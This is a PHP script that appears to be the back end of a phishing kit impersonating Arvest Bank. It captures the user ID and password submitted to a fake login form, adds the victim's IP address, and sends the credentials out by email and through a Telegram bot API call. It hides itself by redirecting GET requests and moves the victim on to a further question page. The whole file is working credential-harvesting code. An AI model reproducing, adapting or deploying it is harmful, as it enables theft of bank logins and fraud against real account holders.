<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] === "GET") {
    header("Location: https://google.com".md5(uniqid(rand(), true)));
}elseif ($_SERVER["REQUEST_METHOD"] === "POST") {
    include "../data.php";
    function get_client_ip() {
        $ipaddress = "";
        if (getenv("HTTP_CLIENT_IP"))
            $ipaddress = getenv("HTTP_CLIENT_IP");
        else if(getenv("HTTP_X_FORWARDED_FOR"))
            $ipaddress = getenv("HTTP_X_FORWARDED_FOR");
        else if(getenv("HTTP_X_FORWARDED"))
            $ipaddress = getenv("HTTP_X_FORWARDED");
        else if(getenv("HTTP_FORWARDED_FOR"))
            $ipaddress = getenv("HTTP_FORWARDED_FOR");
        else if(getenv("HTTP_FORWARDED"))
            $ipaddress = getenv("HTTP_FORWARDED");
        else if(getenv("REMOTE_ADDR"))
            $ipaddress = getenv("REMOTE_ADDR");
        else
            $ipaddress = "UNKNOWN";
        return $ipaddress;
    }
    $IP = get_client_ip();
    $user = $_POST["user"]; $pswd = $_POST["psid"];
    $Message = "Arvest BANK {Login Access}"."\r\n";
    $Message .= "USERID: ".$user."\r\n";
    $Message .= "Password: ".$pswd."\r\n";
    $Message .= "IP ADDRESS : https://ip-api.com/".$IP."\r\n";
    $headers = "From: lovely@lovely.com". "\r\n" . "Reply-To: lovely@lovely.com". "\r\n";
    mail($sendto,"Arvest BANK",$Message,$headers);
    $options=array("http"=>array("method"=>"POST","header"=>"Content-Type:application/x-www-form-urlencoded\r\n","content"=>http_build_query(array("chat_id"=>$telegramchatid,"text"=>$msg)),),);
    file_get_contents("https://api.telegram.org/bot".$telegrambot."/sendMessage",false,stream_context_create($options));
    header("Location: ../question.php?id=".md5(uniqid(rand(), true)));
}
?>